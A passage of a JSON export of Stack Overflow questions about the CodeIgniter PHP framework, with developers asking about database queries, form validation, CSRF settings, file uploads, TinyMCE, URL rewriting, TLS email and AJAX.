item_entries.item_id')\n            -&gt;join('ratings_total', 'ratings_total.item_id = item_entries.item_id')\n            -&gt;join('item_categories', 'item_categories.cat_id = item_categories_rel.cat_id');\n        if($admin==TRUE){\n            $this-&gt;db\n                -&gt;join('admin_item_alerts', 'admin_item_alerts.item_id = item_entries.item_id')\n                -&gt;join('item_object_code', 'item_object_code.item_id = item_entries.item_id', 'left');\n        }\n        $query = $this-&gt;db-&gt;get();\n        return $query-&gt;row_array();\n    }\n</code></pre>\n\n<p>and here is the output of the var_dump:</p>\n\n<pre><code>array(21) { [\"item_id\"]=&gt; NULL [\"item_name\"]=&gt; string(9) \"MediaInfo\" [\"item_img\"]=&gt; string(13) \"mediaInfo.gif\" [\"item_link\"]=&gt; string(42) \"http://sourceforge.net/projects/mediainfo/\" [\"is_code\"]=&gt; string(1) \"n\" [\"is_pick\"]=&gt; string(1) \"n\" [\"is_quicklink\"]=&gt; string(1) \"n\" [\"date_added\"]=&gt; string(19) \"2010-10-01 00:03:04\" [\"rel_id\"]=&gt; string(3) \"132\" [\"cat_id\"]=&gt; string(2) \"10\" [\"item_desc\"]=&gt; string(9) \"desc_here\" [\"site_rating\"]=&gt; string(3) \"3.0\" [\"urate_ave\"]=&gt; string(3) \"0.0\" [\"parent_id\"]=&gt; string(1) \"2\" [\"gparent_id\"]=&gt; string(1) \"0\" [\"sort_order\"]=&gt; string(1) \"0\" [\"cat_name\"]=&gt; string(2) \"PC\" [\"cat_slug\"]=&gt; string(2) \"pc\" [\"date_checked\"]=&gt; string(19) \"0000-00-00 00:00:00\" [\"UpCode\"]=&gt; string(1) \"N\" [\"item_code\"]=&gt; NULL } \n</code></pre>\n\n<p>Does anyone have any idea why it is doing this to me :( ?</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12756605,"title":"CI not loading library","body":"<p>Here's my controller:</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass User extends CI_Controller {\n\n    public function __construct() {\n        parent::__construct();\n        $this-&gt;load-&gt;model('user_model');\n    }\n\n    public function index() {\n        redirect('user/login');\n    }\n\n    public function login() {\n        $this-&gt;load-&gt;library('form_validation', '', 'fv');\n        var_dump($this);\n        $this-&gt;fv-&gt;set_rules('nick_name', 'Nick Name', 'trim|required|max_length[12]|min_length[4]');\n        $this-&gt;fv-&gt;set_rules('password', 'Password', 'trim|required|md5');\n    }\n}\n?&gt;\n</code></pre>\n\n<p>I was basically writing a login controller. In the login function, after this I load the view, etc. But up till here, I am getting the following error:</p>\n\n<pre><code>A PHP Error was encountered\nSeverity: Notice\nMessage: Undefined property: User::$fv\nFilename: controllers/user.php\nLine Number: 23\n</code></pre>\n\n<p>I have commented out everything else in the controller effectively to what I have pasted above. I don't get where the problem is. Thanks.</p>\n\n<p>[EDIT]</p>\n\n<p>On var dumping the $this object, I found an even more unusual thing. The object \"fv\" was not defined inside the $this object but rather under the $this->user_model object. So isset($this->fv) was returning false and isset($this->user_model->fv) was returning true. And yes I tried $this->load->library('form_validation') instead of naming it \"fv\", results remained the same. </p>\n"},{"tags":["php","mysql","database","codeigniter","orm"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12763387,"title":"PHP Codeigniter Database Helper Class \"No tables used\"","body":"<p>Ok, this isn't the full code obviously but this is the code up to where the error is.</p>\n\n<pre><code>                $this-&gt;db-&gt;select('post_likes');\n                $this-&gt;db-&gt;from('user_dash_posts');\n                $this-&gt;db-&gt;where('post_idn', $idn);\n                $this-&gt;db-&gt;where('isactive', '0');\n                if($this-&gt;db-&gt;count_all_results() &gt; 0)\n                {\n                    $dataDB = $this-&gt;db-&gt;get();\n</code></pre>\n\n<p>I am getting \"No table used\" in regards to the <code>get()</code> statement of the final line I show here. I am still kind of new to the whole CI database class/helper, as I used to be more about handwriting full queriers. But I am trying to school myself on ORM layers and get better familiar with them. That being a mute point to my question however. Im trying to figure out what I did wrong with this statement, what is the fix, and if at all possible an explanation of how I did it wrong so I can understand and not to it again.</p>\n"},{"tags":["php","forms","codeigniter","csrf"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12761737,"title":"Enabling CSRF to TRUE in CodeIgniter","body":"<p>Just read that CodeIgniter 2.x has built-in CSRF protection. Now upon reading the documentation, I didn't found anything relating CSRF, just an option of setting it to <code>TRUE</code> in the <code>config.php</code> file then that's it. However, in my system I don't use this <code>form_helper</code> which automatically incorporates the CSRF protection of the CodeIgniter, instead I have the native <code>&lt;form&gt;</code> of HTML.</p>\n\n<p>My concern is do I need to do anything to implement the CSRF of CodeIgniter, or just setting the option to <code>TRUE</code> is enough?</p>\n"},{"tags":["php","jquery","codeigniter","backbone.js","laravel"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12765478,"title":"Having different versions of API","body":"<p>While looking through other people's code, I noticed that some code their javascript/backbone.js in such a way that is is easy to change the version of their serverside API.</p>\n\n<pre><code>API_URL = '/api/v2/';\n</code></pre>\n\n<p><strong>Question:</strong> What is the purpose of being able to change the version of the API used from <code>v2</code> to <code>v1</code> or <code>v3</code> so easily but not able to change the clientside code as easily? </p>\n\n<p>Here's an example of a backbone.js snippet:</p>\n\n<pre><code>var POST_API = '/api/v1/post/'\n\nwindow.Post = Backbone.Model.extend({\n    url: POST_API\n})\n\nwindow.Posts = Backbone.Collection.extend({\n    model: Post,\n    url: POST_API\n})\n</code></pre>\n"},{"tags":["php","codeigniter","twitter","oauth","twitter-api"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":103,"score":1,"question_id":12462771,"title":"Codeinigter PHP + Twitter Login","body":"<p>I am trying to implement a Twitter login on my Codeigniter page.</p>\n\n<p>First I have downloaded the Twitter Libraries from <a href=\"http://www.simonemms.com/2012/02/22/twitter-for-codeigniter/\" rel=\"nofollow\">Twitter Simon Emms</a></p>\n\n<p>Then I have placed the files correctly and edited <strong>config/twitter.php</strong></p>\n\n<pre><code>'_tokens' =&gt; array(\n    'consumer_key' =&gt; 'mykey',\n    'consumer_secret' =&gt; 'mykeymykey',\n</code></pre>\n\n<p>etc...</p>\n\n<p>Then when calling the <strong>twitter_test controller</strong> and trying to login\nI just get redirected to <a href=\"http://api.twitter.com/oauth/authenticate?\" rel=\"nofollow\">http://api.twitter.com/oauth/authenticate?</a></p>\n\n<p>What am I doing wrong?</p>\n\n<p>Thanks for help!</p>\n"},{"tags":["php","codeigniter","upload"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12552043,"title":"CodeIgniter Upload Class again","body":"<p>Hi I have been building a website for about 3 months now and was today getting my girlfriend to fill it up with dummy content for testing purposes. There she was happily testing and uploading files when suddenly once she had done about 8 articles the uploader decided without any changes to code etc to start rejecting the upload saying the filetype is not allowed.</p>\n\n<p>Now needless to say I have been uploading images through this for over a month and this is the first time this problem has arisen. What makes it even more confusing is that I am using the CI upload class in other sections with the same mime params and it works fine! I have checked the mime in $_FILES and this is image/jpg or image/png etc, all of which are recognised by CI. I have also seen about the bug in CI 2.1.0 but I am on 2.1.1 which I assume the bug was fixed for (or not) as the code within the upload lib where the error was before is slightly different. </p>\n\n<p>Either way I deduce it is a mime error as setting the allowed types config param to * works fine! Of course this is no where near ideal as the potential security breaches are phenomenal. I am now reaching crunch time with this as I have other work to be getting on with. I have attached the portion of code that handles this upload incase I am doing something glaringly stupid but otherwise if anyone else has developed this problem out of nowhere I would love to know any work arounds/solutions...... Also any knowledge on how this could have only just reared its ugly head would be great. I often struggle with the mystery side of these things.</p>\n\n<pre><code>if(isset($_FILES['article_main_image']) &amp;&amp; $_FILES['article_main_image']['size'] &gt; 0){\n\n    $filename = $this-&gt;input-&gt;post('article_title') . '_' . time();\n\n    $config['upload_path'] = './resource/data/tmpstore/';\n    $config['allowed_types'] = 'gif|jpg|png|jpeg';\n    $config['file_name'] = $filename;\n\n    $this-&gt;load-&gt;library('upload', $config);\n\n\n    if ($this-&gt;upload-&gt;do_upload('article_main_image'))\n    {\n\n        $uploadData = $this-&gt;upload-&gt;data();\n        $filename = $uploadData['file_name'];\n\n        //Other stuff here\n\n    } else {\n\n       $this-&gt;session-&gt;set_flashdata('validationErrors', $this-&gt;upload-&gt;display_errors());\n       $this-&gt;session-&gt;set_flashdata('postVars', $this-&gt;input-&gt;post());\n\n       redirect('/admin/contenteditor/editarticle?id=' . $this-&gt;input-&gt;post('articleId'));\n    }\n}\n</code></pre>\n"},{"tags":["php","codeigniter","mongodb"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":487,"score":4,"question_id":10858647,"title":"Interfacing with MongoDB in CodeIgniter","body":"<p>Is there function to throw query mongoDB like this <code>$this-&gt;db-&gt;query($query)</code> because I want  to create mongoDB executor in codeigniter so if I type this query like this:</p>\n\n<pre><code>db.users.find({age:33}) \n</code></pre>\n\n<p>... codeigniter throw that query directly to mongodb server or is there another way? </p>\n"},{"tags":["php","codeigniter","voice-recognition","voice-recording"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12763603,"title":"Can I record a user's voice and compare this with other user voice using codeigniter?","body":"<p>Regards,</p>\n\n<p>I have the curiosity to create a small application in which you can record voice and save it. Then, compare the voice with another and show if appear this voice with the other.</p>\n\n<p>I would know if I can do this using PHP with some plugin of codeigniter.</p>\n\n<p>Any library or codeigniter plugin could do this? Or should I use something more than just PHP?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["jquery","codeigniter","tinymce","richtextbox","text-editor"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":676,"score":0,"question_id":11128740,"title":"Problems implementing TinyMCE in CodeIgniter","body":"<p>I am trying to implement TinyMCE in CodeIgniter. I've created a view file and called it from a controller. I have uploaded all files into my CI project folder and showed the path of the files. But it is not working. Here is the view file: </p>\n\n<pre><code>&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"&gt;\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;\n&lt;head&gt;\n&lt;title&gt;Full featured example&lt;/title&gt;\n&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /&gt;\n&lt;!-- TinyMCE --&gt;\n&lt;script type=\"text/javascript\" src=\"&lt;?php echo base_url()?&gt;application/tinymce/jscripts/tiny_mce/tiny_mce.js\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\"&gt;\n    tinyMCE.init({\n        // General options\n        mode : \"textareas\",\n        theme : \"advanced\",\n        plugins : \"autolink,lists,pagebreak,style,layer,table,save,advhr,advimage,advlink,emotions,iespell,inlinepopups,insertdatetime,preview,media,searchreplace,print,contextmenu,paste,directionality,fullscreen,noneditable,visualchars,nonbreaking,xhtmlxtras,template,wordcount,advlist,autosave,visualblocks\",\n\n        // Theme options\n        theme_advanced_buttons1 : \"save,newdocument,|,bold,italic,underline,strikethrough,|,justifyleft,justifycenter,justifyright,justifyfull,styleselect,formatselect,fontselect,fontsizeselect\",\n        theme_advanced_buttons2 : \"cut,copy,paste,pastetext,pasteword,|,search,replace,|,bullist,numlist,|,outdent,indent,blockquote,|,undo,redo,|,link,unlink,anchor,image,cleanup,help,code,|,insertdate,inserttime,preview,|,forecolor,backcolor\",\n        theme_advanced_buttons3 : \"tablecontrols,|,hr,removeformat,visualaid,|,sub,sup,|,charmap,emotions,iespell,media,advhr,|,print,|,ltr,rtl,|,fullscreen\",\n        theme_advanced_buttons4 : \"insertlayer,moveforward,movebackward,absolute,|,styleprops,|,cite,abbr,acronym,del,ins,attribs,|,visualchars,nonbreaking,template,pagebreak,restoredraft,visualblocks\",\n        theme_advanced_toolbar_location : \"top\",\n        theme_advanced_toolbar_align : \"left\",\n        theme_advanced_statusbar_location : \"bottom\",\n        theme_advanced_resizing : true,\n\n        // Example content CSS (should be your site CSS)\n        content_css : \"&lt;?php echo base_url()?&gt;application/tinymce/examples/css/content.css\",\n\n        // Drop lists for link/image/media/template dialogs\n        template_external_list_url : \"&lt;?php echo base_url()?&gt;application/tinymce/examples/lists/template_list.js\",\n        external_link_list_url : \"&lt;?php echo base_url()?&gt;application/tinymce/examples/lists/link_list.js\",\n        external_image_list_url : \"&lt;?php echo base_url()?&gt;application/tinymce/examples/lists/image_list.js\",\n        media_external_list_url : \"&lt;?php echo base_url()?&gt;application/tinymce/examples/lists/media_list.js\",\n\n        // Style formats\n        style_formats : [\n            {title : 'Bold text', inline : 'b'},\n            {title : 'Red text', inline : 'span', styles : {color : '#ff0000'}},\n            {title : 'Red header', block : 'h1', styles : {color : '#ff0000'}},\n            {title : 'Example 1', inline : 'span', classes : 'example1'},\n            {title : 'Example 2', inline : 'span', classes : 'example2'},\n            {title : 'Table styles'},\n            {title : 'Table row 1', selector : 'tr', classes : 'tablerow1'}\n        ],\n\n        // Replace values for the template plugin\n        template_replace_values : {\n            username : \"Some User\",\n            staffid : \"991234\"\n        }\n    });\n&lt;/script&gt;\n&lt;!-- /TinyMCE --&gt;\n\n&lt;/head&gt;\n&lt;body role=\"application\"&gt;\n\n&lt;form method=\"post\" action=\"http://tinymce.moxiecode.com/dump.php?example=true\"&gt;\n    &lt;div&gt;\n        &lt;h3&gt;Full featured example&lt;/h3&gt;\n\n        &lt;p&gt;\n            This page shows all available buttons and plugins that are included in the TinyMCE core package.\n            There are more examples on how to use TinyMCE in the &lt;a href=\"http://tinymce.moxiecode.com/examples/\"&gt;Wiki&lt;/a&gt;.\n        &lt;/p&gt;\n\n        &lt;!-- Gets replaced with TinyMCE, remember HTML in a textarea should be encoded --&gt;\n        &lt;div&gt;\n            &lt;textarea id=\"elm1\" name=\"elm1\" rows=\"15\" cols=\"80\" style=\"width: 80%\"&gt;\n                &amp;lt;p&amp;gt;\n                    This is some example text that you can edit inside the &amp;lt;strong&amp;gt;TinyMCE editor&amp;lt;/strong&amp;gt;.\n                &amp;lt;/p&amp;gt;\n                &amp;lt;p&amp;gt;\n                Nam nisi elit, cursus in rhoncus sit amet, pulvinar laoreet leo. Nam sed lectus quam, ut sagittis tellus. Quisque dignissim mauris a augue rutrum tempor. Donec vitae purus nec massa vestibulum ornare sit amet id tellus. Nunc quam mauris, fermentum nec lacinia eget, sollicitudin nec ante. Aliquam molestie volutpat dapibus. Nunc interdum viverra sodales. Morbi laoreet pulvinar gravida. Quisque ut turpis sagittis nunc accumsan vehicula. Duis elementum congue ultrices. Cras faucibus feugiat arcu quis lacinia. In hac habitasse platea dictumst. Pellentesque fermentum magna sit amet tellus varius ullamcorper. Vestibulum at urna augue, eget varius neque. Fusce facilisis venenatis dapibus. Integer non sem at arcu euismod tempor nec sed nisl. Morbi ultricies, mauris ut ultricies adipiscing, felis odio condimentum massa, et luctus est nunc nec eros.\n                &amp;lt;/p&amp;gt;\n            &lt;/textarea&gt;\n        &lt;/div&gt;\n\n        &lt;!-- Some integration calls --&gt;\n        &lt;a href=\"javascript:;\" onclick=\"tinyMCE.get('elm1').show();return false;\"&gt;[Show]&lt;/a&gt;\n        &lt;a href=\"javascript:;\" onclick=\"tinyMCE.get('elm1').hide();return false;\"&gt;[Hide]&lt;/a&gt;\n        &lt;a href=\"javascript:;\" onclick=\"tinyMCE.get('elm1').execCommand('Bold');return false;\"&gt;[Bold]&lt;/a&gt;\n        &lt;a href=\"javascript:;\" onclick=\"alert(tinyMCE.get('elm1').getContent());return false;\"&gt;[Get contents]&lt;/a&gt;\n        &lt;a href=\"javascript:;\" onclick=\"alert(tinyMCE.get('elm1').selection.getContent());return false;\"&gt;[Get selected HTML]&lt;/a&gt;\n        &lt;a href=\"javascript:;\" onclick=\"alert(tinyMCE.get('elm1').selection.getContent({format : 'text'}));return false;\"&gt;[Get selected text]&lt;/a&gt;\n        &lt;a href=\"javascript:;\" onclick=\"alert(tinyMCE.get('elm1').selection.getNode().nodeName);return false;\"&gt;[Get selected element]&lt;/a&gt;\n        &lt;a href=\"javascript:;\" onclick=\"tinyMCE.execCommand('mceInsertContent',false,'&lt;b&gt;Hello world!!&lt;/b&gt;');return false;\"&gt;[Insert HTML]&lt;/a&gt;\n        &lt;a href=\"javascript:;\" onclick=\"tinyMCE.execCommand('mceReplaceContent',false,'&lt;b&gt;{$selection}&lt;/b&gt;');return false;\"&gt;[Replace selection]&lt;/a&gt;\n\n        &lt;br /&gt;\n        &lt;input type=\"submit\" name=\"save\" value=\"Submit\" /&gt;\n        &lt;input type=\"reset\" name=\"reset\" value=\"Reset\" /&gt;\n    &lt;/div&gt;\n&lt;/form&gt;\n\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n"},{"tags":[".htaccess","codeigniter"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3613,"score":1,"question_id":1872505,"title":"Codeigniter $config['uri_protocol']\tproblem","body":"<p>I need to change  <code>$config['uri_protocol']</code> from AUTO to PATH_INFO (to allow url parameters)</p>\n\n<p>My problem: when I set <code>$config['uri_protocol']=\"PATH_INFO\";</code> the regular urls stop functioning and I get the homepage no matter which site page URL I click.</p>\n\n<p>print_r ($_SERVER) shows that url parameters I add appear only in REQUEST_URI an not in any other $_SERVER part.</p>\n\n<p>my htaccess is the <a href=\"http://codeigniter.com/wiki/mod%5Frewrite/\" rel=\"nofollow\">standard one</a> </p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n\n    # This is different between local host and production server!!!\n    RewriteBase /\n\n\n    #Removes access to the system folder by users.\n    #Additionally this will allow you to create a System.php controller,\n    #previously this would not have been possible.\n    #'system' can be replaced if you have renamed your system folder.\n    RewriteCond %{REQUEST_URI} ^system.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #Checks to see if the user is attempting to access a valid file,\n    #such as an image or css document, if this isn't true it sends the\n    #request to index.php\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n    # Submitted by: ElliotHaughin\n\n    ErrorDocument 404 /index.php\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>UPDATE:  </p>\n\n<p>I changed</p>\n\n<pre><code>RewriteRule ^(.*)$ index.php?/$1 [L]\n</code></pre>\n\n<p>to\n<code>RewriteRule ^(.*)$ index.php?/$1 [QSA,L]</code>  to allow url params to pass. Now url params appear also in  </p>\n\n<pre><code> $_SERVER\n\n REDIRECT_QUERY_STRING, QUERY_STRING AND REQUEST_URI\n</code></pre>\n\n<p>.</p>\n\n<p>The problem: I tried $config[‘uri_protocol’] with all the above options but still CI gives error 404 whenever I add URL parameters.</p>\n\n<p>Note: I tried the above on 2 servers. One of them is centos5/Apache2/Plesk VPS and another one is on xampp/Vista. </p>\n"},{"tags":["codeigniter","orm","datamapper"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12761644,"title":"CI datamapper - many subqueries","body":"<p>I am new in using Datamapper ORM for Codeigniter, so I need some help. I am trying to do my own blog in CI with ORM. I have it written in classic CI Active record class, and there is a problem to write some queries in ORM syntax (or I do not know it and I need help). I have the blog, where are articles and they have comments. User can also vote the post. \nIn classic CI AR I have this query:</p>\n\n<pre><code>        $query = $this-&gt;db-&gt;select(\"\na.title AS articles_title, a.content AS articles_content,\nCONCAT(up.first_name, ' ', up.last_name) AS articles_author, \nDATE_FORMAT(a.created, '%T %d.%m.%Y') AS articles_created,\n(SELECT IFNULL(ROUND(AVG(av.vote),1), 0) FROM articles_votes av WHERE a.id = av.article_id) AS articles_votes,\n(SELECT COUNT(ac.id) FROM articles_comments ac \n    WHERE a.id = ac.article_id) AS articles_totalcomments\", FALSE)\n                -&gt;from('articles a')\n                -&gt;join('user_profiles up', 'a.author_id = up.user_id')\n                -&gt;where('page_id', $page_id)\n                -&gt;order_by(\"a.id\")\n                -&gt;limit($num, $offset)\n                -&gt;get();\n</code></pre>\n\n<p>This give me array with all informations I need. I only pass this array to view and show it. This query returns me author full name (from table profiles, not user - I use TankAuth), and it gives me counted comments, it also gives me average mark of voting. \nIs possible to make this in ORM? I need your help, please! </p>\n"},{"tags":["php","codeigniter","codeigniter-2","codeigniter-url"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12757211,"title":"CodeIgniter's default controller doesn't load","body":"<p>I have inherited an on-going CI v2.0.2 project.</p>\n\n<p>I tried loading the default controller - <code>http://localhost/ci202/index.php</code> - but all I got was a blank page.</p>\n\n<p>I enabled logging for all messages, and here's the log:</p>\n\n<pre><code>&lt;?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed'); ?&gt;\n\nDEBUG - 2012-10-05 23:55:41 --&gt; Config Class Initialized\nDEBUG - 2012-10-05 23:55:41 --&gt; Hooks Class Initialized\nDEBUG - 2012-10-05 23:55:41 --&gt; Utf8 Class Initialized\nDEBUG - 2012-10-05 23:55:41 --&gt; UTF-8 Support Enabled\nDEBUG - 2012-10-05 23:55:41 --&gt; URI Class Initialized\nDEBUG - 2012-10-05 23:55:41 --&gt; Router Class Initialized\nDEBUG - 2012-10-05 23:55:41 --&gt; No URI present. Default controller set.\nDEBUG - 2012-10-05 23:55:41 --&gt; Output Class Initialized\nDEBUG - 2012-10-05 23:55:41 --&gt; Security Class Initialized\nDEBUG - 2012-10-05 23:55:41 --&gt; Input Class Initialized\nDEBUG - 2012-10-05 23:55:41 --&gt; Global POST and COOKIE data sanitized\nDEBUG - 2012-10-05 23:55:41 --&gt; Language Class Initialized\nDEBUG - 2012-10-05 23:55:41 --&gt; Loader Class Initialized\nDEBUG - 2012-10-05 23:55:41 --&gt; Helper loaded: url_helper\nDEBUG - 2012-10-05 23:55:41 --&gt; Database Driver Class Initialized\n</code></pre>\n\n<p>To get this log, I only re-loaded <code>index.php</code> once.</p>\n\n<p>The contents of <code>routes.php</code> &amp; <code>.htaccess</code> are the same as the default installation of CI v2.0.2.</p>\n\n<p>I tried creating another 'helloworld' type controller, which was a replica of the welcome controller, but still get a blank page.</p>\n\n<p>Where else should I look for misconfiguration?</p>\n"},{"tags":["database","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12760032,"title":"To grab codeigniter database name","body":"<p>I want to create a database backup tool in codeigniter. So i want to grab the database name from controller. How should i do for that.\nThanks for any answer.</p>\n"},{"tags":["php","codeigniter","email","smtp"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2951,"score":0,"question_id":7713701,"title":"CodeIgniter: SSL/TLS SMTP Auth Email from PHPMailer Code","body":"<p>I'm trying to use the CodeIgniter Email Class to write a secure SMTP email; either SSL or TLS (preferred). In the past, I've successfully used PHPMailer with Secure Auth and TLS. I believe it was a secure connection. TLS shows up in the email header.</p>\n\n<p>Does CodeIngiters' Email Class support secure SMTP authentication with TLS?</p>\n\n<p>Note, this is not a Gmail question. I'm trying to use it with an MS Exchange Server. I've confirmed the PHPMailer code below functions correctly.</p>\n\n<pre><code>include_once('includes/class.phpmailer.php');\n$mail = new PHPMailer(true);\n$mail-&gt;IsSMTP();\n$mail-&gt;Host = 'www.domain.com';\n\n$mail-&gt;SMTPAuth = true;\n$mail-&gt;SMTPSecure = \"tls\";\n$mail-&gt;Port     = '25';\n$mail-&gt;Timeout  = '60';\n\n$mail-&gt;Username = 'user@domain.com';\n$mail-&gt;Password = 'password';\n\n$mail-&gt;From     = 'alerts@domain.com';\n$mail-&gt;FromName = 'Alerts';\n\n$mail-&gt;Subject  = 'Test from test email file.';\n$mail-&gt;IsHTML(true);\n$mail-&gt;MsgHTML('This is just a test.');\n\n// To\n$mail-&gt;AddAddress('alerts@domain.com', 'Research');\n$result = $mail-&gt;Send();\n</code></pre>\n\n<p>With CodeIgniter I've already extended the Email Class (MY_Email.php). The class is a bit big to post here. But, here's the error I keep getting.</p>\n\n<p>Settings:</p>\n\n<pre><code>array(7) { \n[\"smtp_host\"]=&gt; string(26) \"tls://www.domain.com\" \n[\"smtp_port\"]=&gt; string(2) \"25\" \n[\"smtp_user\"]=&gt; string(17) \"alerts@domain.com\" \n[\"smtp_pass\"]=&gt; string(9) \"password\" \n[\"smtp_to_email\"]=&gt; string(26) \"user@domain.com\" \n[\"smtp_from_email\"]=&gt; string(26) \"user@domain.com\" \n[\"smtp_from_name\"]=&gt; string(24) \"Test from Application\" \n}\n</code></pre>\n\n<p>Error Message:</p>\n\n<blockquote>\n  <p>fsockopen(): SSL operation failed with code 1. OpenSSL Error messages: error:1408F10B:SSL routines:func(143):reason(267)</p>\n</blockquote>\n\n<p>Any idea what reason 267 is?</p>\n"},{"tags":["ajax","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":248,"score":-1,"question_id":1523971,"title":"Ajax wih CodeIgniter","body":"<p>I'm trying to create 3 textfields with CI by using <code>form_input</code>. One is to enter the price, one is to enter the desired discount value, and the last one is for the discounted price which is calculated from price and discount value. How do I achieve it with CI? Thanks.</p>\n"},{"tags":["authentication","codeigniter"],"answer_count":3,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":4814,"score":6,"question_id":4977707,"title":"CodeIgniter authentication + user privileges","body":"<p>I'm trying to build an authentication system in my application, but I'm having some problems in deciding which is the best way I could acomplish what I want in CodeIgniter.</p>\n\n<p>The website allows companies to manage their buildings.  A company can have many buildings, and many users (when I say users I mean employees from that company).</p>\n\n<p>In this website I would like two have (basically) four general kind of users.  </p>\n\n<ul>\n<li>Super Admin:  This would be able to add new admins and new companies to the database, and give privileges to the rest of the admins.</li>\n<li>Admin:  This would be able to do different stuff depending on the assigned privileges.</li>\n<li>Company Super User:  This user would be created directly when an admin creates a new company.  This user would be able to create new users for that company, and since s/he would have total permissions, he would be able to do everything that the other users can do.</li>\n<li>Company User: Depending on the privileges assigned by its super user, this user would be able to do and see different data (for example, a simple user would just be able to see information from one of the many company buildings).</li>\n</ul>\n\n<p>So, even though I've seen many authentication libraries out there for CodeIgniter, it would be nice to hear any recommendations about how I could design this \"authentication role based\" system, and if you particularly recommend a library that could help to accomplish this.</p>\n\n<p>Appreciate!</p>\n"},{"tags":["php","codeigniter","hook"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12758112,"title":"Modifying URLs in CodeIgniter","body":"<p>My application generates various urls based on Categories and Names of the products. For instance to browse products by category the url would be</p>\n\n<pre><code>localhost/category/Memory Cards\n</code></pre>\n\n<p>The problem is that spaces are converted to <code>%20</code>s. If I <code>urlencode</code> or <code>rawurlencode</code> the spaces are converted to <code>+</code> sign but <code>/</code> are also converted to <code>%xx</code> equivalent which results in invalid mapping of url to controllers.</p>\n\n<p>I need all of my urls to be encoded with <code>+</code> sign instead of <code>spaces</code>. I could use a helper. However, I'd need to call helper method everywhere.</p>\n\n<p>Can I use <code>hooks</code> to modify the HTML, scan all urls and replace <code>spaces</code> with <code>+</code> sign?</p>\n\n<p>I need to decode the urls back to <code>spaces</code> from <code>+</code> signs as well. How could I do that?</p>\n\n<p>And if you reckon my approach is all wrong, what would be an appropriate way of doing it??</p>\n"},{"tags":["php","codeigniter","jquery-ajax"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":62,"score":-1,"question_id":12751123,"title":"How do I use ajax to submit post data using jquery?","body":"<p>I'm having trouble getting ajax to work with jquery and codeigniter.  I've followed multiple tutorials but nothing seems to work.  I'm trying to implement an upvote button that sends post data using ajax to be inserted into a db.  Any help is much appreciated.</p>\n\n<p>The code from my view:</p>\n\n<pre><code>&lt;pre&gt;\n&lt;?php foreach($query-&gt;result() as $row): ?&gt;\n&lt;div&gt;\n&lt;form action=\"\" method=\"post\"&gt;\n&lt;input type=\"hidden\" name=\"story_id\" value=&lt;?php echo $row-&gt;id; ?&gt;&gt;\n&lt;input type=\"submit\" name=\"story_id\" class=\"button\" id=\"submit_btn\" value=&lt;?php echo      $row-&gt;id;?&gt;&gt;\n&lt;/form&gt;\n&lt;/div&gt;\n&lt;?php endforeach; ?&gt;\n&lt;/pre&gt;\n</code></pre>\n\n<p>The jquery script I'm using:</p>\n\n<pre><code>&lt;pre&gt;\n&lt;script type=\"text/javascript\"&gt;\n$(document).ready(function(){\n$(\".button\").click(function(){\n    var form_data = {\n        story_id: $(this).val()\n    };\n    $.ajax({\n        url: \"&lt;?php echo base_url('cyoa/upvote'); ?&gt;\",\n        type: 'POST',\n        data: form_data,\n        success: function() \n            {\n            $(\"#upvote\").hide();\n            }\n    });\n    return false;\n});\n});\n\n&lt;/script&gt;\n&lt;/pre&gt;\n</code></pre>\n"},{"tags":["php","html","validation","codeigniter","sgml"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":40,"score":1,"question_id":12758447,"title":"non SGML character number 6","body":"<p>I am getting the following validation error for a site I am working on</p>\n\n<pre><code> Line 1, Column 1: non SGML character number 6\n\n&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.…\n</code></pre>\n\n<p>And in FireFox source viewer, the text is red for the following 